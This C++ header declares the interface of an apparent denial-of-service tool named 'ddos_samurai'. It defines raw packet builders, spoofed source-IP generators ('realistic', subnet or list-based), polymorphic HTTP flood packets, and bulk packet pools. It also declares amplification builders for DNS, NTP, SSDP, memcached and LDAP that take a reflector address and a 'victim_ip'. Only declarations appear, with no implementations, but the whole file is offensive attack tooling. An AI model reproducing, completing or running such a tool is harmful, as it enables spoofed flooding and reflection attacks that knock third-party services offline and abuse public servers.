#pragma once

#include <cstdint>
#include <memory>
#include <optional>
#include <string>
#include <tuple>
#include <vector>

namespace ddos_samurai::cpu_native {

constexpr int PROTO_ICMP = 1;
constexpr int PROTO_TCP = 6;
constexpr int PROTO_UDP = 17;

constexpr int TCP_FIN = 0x01;
constexpr int TCP_SYN = 0x02;
constexpr int TCP_RST = 0x04;
constexpr int TCP_PSH = 0x08;
constexpr int TCP_ACK = 0x10;
constexpr int TCP_URG = 0x20;
constexpr int TCP_ECE = 0x40;
constexpr int TCP_CWR = 0x80;

constexpr int TCP_OPT_EOL = 0;
constexpr int TCP_OPT_NOP = 1;
constexpr int TCP_OPT_MSS = 2;
constexpr int TCP_OPT_WSCALE = 3;
constexpr int TCP_OPT_SACK_OK = 4;
constexpr int TCP_OPT_SACK = 5;
constexpr int TCP_OPT_TIMESTAMP = 8;

struct SpoofOptions {
  std::string mode{"realistic"};
  std::optional<std::string> subnet;
  std::optional<std::string> list_file;
};

struct PacketConfig {
  std::string target_ip;
  int target_port{0};
  std::string protocol{"tcp"};
  bool spoof{false};
  SpoofOptions spoof_opts{};
  std::vector<uint8_t> payload{};
  bool has_payload{false};
  std::string tcp_flags{"S"};
  std::optional<int> ttl;
  std::optional<int> tos;
  std::optional<int> window;
  bool fragment_enabled{false};
  int fragment_size{800};
  int pad_size{0};
  std::string attack_vector{"basic"};
  std::string dns_name{"example.com"};
  std::vector<std::string> dns_qtypes{"A"};
  bool dns_edns{false};
  bool dns_recursive{true};
};

struct PacketPoolBuffer {
  std::shared_ptr<std::vector<uint8_t>> storage;
  size_t packet_size{0};

  PacketPoolBuffer();
  PacketPoolBuffer(std::shared_ptr<std::vector<uint8_t>> data, size_t stride);
  uint8_t* data();
  const uint8_t* data() const;
  size_t size() const;
};

struct OSProfile {
  std::string name;
  int ttl;
  int window;
  std::vector<std::pair<int, std::optional<int>>> tcp_options;
};

uint16_t checksum(const uint8_t* data, size_t len);
int ip_to_int(const std::string& ip_str);
std::string int_to_ip(uint32_t value);
std::vector<uint8_t> ip_to_bytes(const std::string& ip_str);
std::string generate_random_ip();
std::string generate_realistic_ip();
std::string generate_ip_from_subnet(const std::string& subnet);
std::vector<std::string> load_ips_from_file(const std::string& path);
std::string resolve_local_source_ip(const std::string& target_ip);
std::string get_spoofed_ip(const std::string& mode, const std::optional<std::string>& subnet, const std::optional<std::string>& list_file);
int parse_tcp_flags(const std::string& flags_str);
std::vector<uint8_t> build_tcp_options(const std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>>& options);
void build_tcp_options(std::vector<uint8_t>& out, const std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>>& options);
std::vector<uint8_t> build_ipv4_header(
    const std::string& src_ip,
    const std::string& dst_ip,
    int protocol,
    int payload_len,
    int ttl,
    int tos,
    int identification,
    uint16_t flags_frag,
    const std::vector<uint8_t>& options);
void build_ipv4_header(
    std::vector<uint8_t>& out,
    const std::string& src_ip,
    const std::string& dst_ip,
    int protocol,
    int payload_len,
    int ttl,
    int tos,
    int identification,
    uint16_t flags_frag,
    const std::vector<uint8_t>& options);
std::vector<uint8_t> build_tcp_header(
    int src_port,
    int dst_port,
    uint32_t seq,
    uint32_t ack,
    int flags,
    int window,
    int urgent,
    const std::vector<uint8_t>& options_bytes,
    uint32_t src_ip_int,
    uint32_t dst_ip_int,
    const std::vector<uint8_t>& payload);
void build_tcp_header(
    std::vector<uint8_t>& out,
    int src_port,
    int dst_port,
    uint32_t seq,
    uint32_t ack,
    int flags,
    int window,
    int urgent,
    const std::vector<uint8_t>& options_bytes,
    uint32_t src_ip_int,
    uint32_t dst_ip_int,
    const std::vector<uint8_t>& payload);
std::vector<uint8_t> build_udp_header(
    int src_port,
    int dst_port,
    const std::vector<uint8_t>& payload,
    uint32_t src_ip_int,
    uint32_t dst_ip_int,
    bool compute_checksum);
void build_udp_header(
    std::vector<uint8_t>& out,
    int src_port,
    int dst_port,
    const std::vector<uint8_t>& payload,
    uint32_t src_ip_int,
    uint32_t dst_ip_int,
    bool compute_checksum);
std::vector<uint8_t> build_icmp_echo(int identifier, int sequence, const std::vector<uint8_t>& payload);
void build_icmp_echo(std::vector<uint8_t>& out, int identifier, int sequence, const std::vector<uint8_t>& payload);
std::vector<uint8_t> build_ethernet_header(const std::vector<uint8_t>& dst_mac, const std::vector<uint8_t>& src_mac, int ethertype);
void build_ethernet_header(std::vector<uint8_t>& out, const std::vector<uint8_t>& dst_mac, const std::vector<uint8_t>& src_mac, int ethertype);
std::vector<uint8_t> build_dns_query(const std::string& qname, const std::string& qtype, bool recursive, bool edns, int transaction_id);
void build_dns_query(std::vector<uint8_t>& out, const std::string& qname, const std::string& qtype, bool recursive, bool edns, int transaction_id);
std::vector<uint8_t> build_transport_packet(const PacketConfig& cfg);
void build_transport_packet(std::vector<uint8_t>& out, const PacketConfig& cfg);
std::vector<uint8_t> build_dns_packet(const PacketConfig& cfg);
void build_dns_packet(std::vector<uint8_t>& out, const PacketConfig& cfg);
std::vector<uint8_t> build_polymorphic_http_packet(const PacketConfig& cfg);
void build_polymorphic_http_packet(std::vector<uint8_t>& out, const PacketConfig& cfg);
std::vector<uint8_t> create_packet(const PacketConfig& cfg);
std::tuple<std::shared_ptr<std::vector<uint8_t>>, size_t> generate_packet_pool_impl(const PacketConfig& cfg, int count, bool uniform_size, bool low_peak_memory);
PacketPoolBuffer generate_packet_pool_view(const PacketConfig& cfg, int count, bool uniform_size, bool low_peak_memory);
std::pair<std::vector<uint8_t>, size_t> generate_packet_pool(const PacketConfig& cfg, int count, bool uniform_size, bool low_peak_memory);
std::vector<std::vector<uint8_t>> fragment_packet(const std::vector<uint8_t>& packet, int fragment_size);
std::vector<uint8_t> add_ethernet_frame(const std::vector<uint8_t>& ip_packet, const std::vector<uint8_t>& dst_mac, const std::vector<uint8_t>& src_mac);
std::vector<uint8_t> create_dns_amp_packet(const std::string& reflector_ip, const std::string& victim_ip, const std::string& dns_name);
std::vector<uint8_t> create_ntp_amp_packet(const std::string& reflector_ip, const std::string& victim_ip);
std::vector<uint8_t> create_ssdp_amp_packet(const std::string& reflector_ip, const std::string& victim_ip);
std::vector<uint8_t> create_memcached_amp_packet(const std::string& reflector_ip, const std::string& victim_ip);
std::vector<uint8_t> create_ldap_amp_packet(const std::string& reflector_ip, const std::string& victim_ip);
std::vector<OSProfile> os_profiles();

}  // namespace ddos_samurai::cpu_native
